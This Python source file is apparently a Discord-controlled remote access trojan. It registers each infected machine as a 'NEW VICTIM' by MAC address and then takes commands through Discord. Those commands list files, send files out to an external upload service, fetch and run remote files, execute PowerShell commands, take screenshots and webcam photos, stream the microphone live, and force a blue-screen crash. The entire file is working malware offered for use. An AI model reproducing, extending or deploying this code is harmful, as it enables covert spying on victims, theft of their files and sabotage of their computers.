import discord
import sys
from settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW
import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
from threading import Timer
from datetime import datetime
from uuid import getnode as get_mac
import discord
import os
import pyaudio
import subprocess
from threading import Timer
from datetime import datetime
from uuid import getnode as get_mac

import pyaudio

bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)


commands = "\n".join([
    "help - Help Command",
    "ping - Ping Command",
    "cd - Change Directory",
    "ls - List Directory",
    "download <file> - Download File",
    "upload <link> - Upload File",
    "cmd - Execute CMD Command",
    "run <file> - Run an File",
    "screenshot - Take a Screenshot",
    "blue - DeadScreen",
    "start - Add To start",
    "exit - Exit The Session",
])



intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)

async def search_voice_channel(guild, channel_name):
    for channel in guild.voice_channels:
        if channel.name == channel_name:
            return channel
    
    return None

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

async def create_channels(guild, mac_address):
    text_channel = await find_channel_by_name(guild, mac_address)
    voice_channel = await find_channel_by_name(guild, mac_address)

    if text_channel and voice_channel:
        print("Channels with name {} already exist.".format(mac_address))
        return text_channel, voice_channel

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    if not text_channel:
        text_channel = await guild.create_text_channel(mac_address, overwrites=overwrites)
        print("Text channel with name {} created.".format(mac_address))

    if not voice_channel:
        voice_channel = await guild.create_voice_channel(mac_address, overwrites=overwrites)
        print("Voice channel with name {} created.".format(mac_address))

    return text_channel, voice_channel

@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    mac_address = str(get_mac())
    text_channel, voice_channel = await create_channels(guild, mac_address)

    if text_channel and voice_channel:
        firstrun = True if text_channel.created_at == voice_channel.created_at else False

        if firstrun:
            await text_channel.send("Old Victim started the program again.\n @everyone")

        else:
            await text_channel.send("NEW VICTIM! with the MAC address: {}.\n @everyone".format(mac_address))

@client.event
async def on_message(message):
    guild = client.get_guild(int(guild_id))
    print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
    if message.author == client.user:
        return

    if message.channel.name != str(get_mac()):
        return

    if message.content == "help" or message.content == "Help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping" or message.content == "Ping":
        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd") or message.content.startswith("Cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls" or message.content == "Ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download") or message.content.startswith("Download"):
        file = message.content.split(" ")[1]
        try:
            link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload") or message.content.startswith("Upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell") or message.content.startswith("Shell"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run") or message.content.startswith("Run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("exit"):
        await message.channel.delete()
        await voice_channel.channel.delete()
        await client.close()
    
    if message.content == "start":
        await message.reply("Ok Boss")

        
    if message.content == "blue" or message.content == "Blue":
        await message.reply("Attempting...", delete_after = .1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Blue Successful!")
        else:
            await message.reply("Blue Failed! :(")

    if message.content.startswith("screenshot"):
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == 'photo':
        webcam = VideoCapture(0, CAP_DSHOW)
        result, image = webcam.read()
        imwrite('webcam.png', image)
        await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
        subprocess.run('del webcam.png', shell=True)
        
    if message.content == 'purge':
        await message.reply('Purging...')
        await message.channel.purge(limit=None)

    if message.content == '.join':
            await message.delete()
            voice_channel = await search_voice_channel(guild, str(get_mac()))
            if voice_channel:
                vc = await voice_channel.connect(self_deaf=True)
                vc.play(discord.PCMVolumeTransformer(PyAudioSource()))
                await message.channel.send('`[ time ] Joined voice-channel and streaming microphone in realtime`')
            else:
                await message.channel.send("Voice channel not found.")

client.run(bot_token)



# anywhere
class PyAudioSource(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        self.p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = self.p.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=rate,
            input=True,
            input_device_index=input_device,
            frames_per_buffer=chunk
        )

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)